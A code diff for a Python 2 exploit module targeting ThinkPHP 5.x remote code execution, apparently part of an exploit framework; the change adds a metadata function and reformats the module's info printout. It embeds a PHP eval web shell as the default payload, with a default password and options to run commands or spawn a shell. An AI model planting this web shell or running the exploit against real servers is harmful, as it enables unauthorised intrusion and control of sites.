@@ -2,6 +2,25 @@ import requests
 import re
 
 
+def info(): # Exploit information for database mechanism
+    info = {
+        'name': 'thinkphp_5x_rce',
+        'description': 'ThinkPHP 5.x Remote code execution',
+        'date': '2018-12-27',
+        'parameters': {
+            'url': 'Target URL',
+            'command': '(OPTIONAL) Command to execute',
+            'shell': '(OPTIONAL) Spawn shell',
+            'payload': '(REQUIRE shell OPTION) Shell content. Default is: <?php @eval($_POST[%PASSWORD%])?>',
+            'password': '(REQUIRE shell OPTION) Shell password. Default is: "X"',
+            'timeout': 'Request timeout.'
+        },
+        'referer': 'None'
+    }
+    return info
+
+
+
 class exploit():
     def __init__(self):
         self.param = {'url': None, 'command': None, 'shell': None,'password': 'X', 'payload': '<?php @eval($_POST["/*REPL*/"])?>', 'timeout': 3}
@@ -47,13 +66,14 @@ class exploit():
 
 
     def info(self):
-        print '''
-        ThinkPHP 5.x RCE
-        Parameters:
-            url: Target url
-            command: (OPTIONAL) Command to execute
-            shell: (OPTIONAL) Spawn shell
-                payload: Shell content, Default is <?php @eval($_POST[%PASSWORD%])?>
-                password: Shell password, Default is "X"
-            timeout: Request timeout, Default is 3
-        '''
+        ExpInf = info()
+        print '[*] Incoming exploit information.'
+        print ' |   NAME: %s' %(ExpInf['name'])
+        print ' |   DESCRIPTION: %s' %(ExpInf['description'])
+        print ' |   DATE: %s' %(ExpInf['date'])
+        print ' |   PARAMETERS:'
+        parameters = ExpInf['parameters']
+        for item in ExpInf['parameters'].keys():
+            print ' |   |  %s: %s' %(item, parameters[item])
+        print ' |   REFERER: %s' %(ExpInf['referer'])
+        return
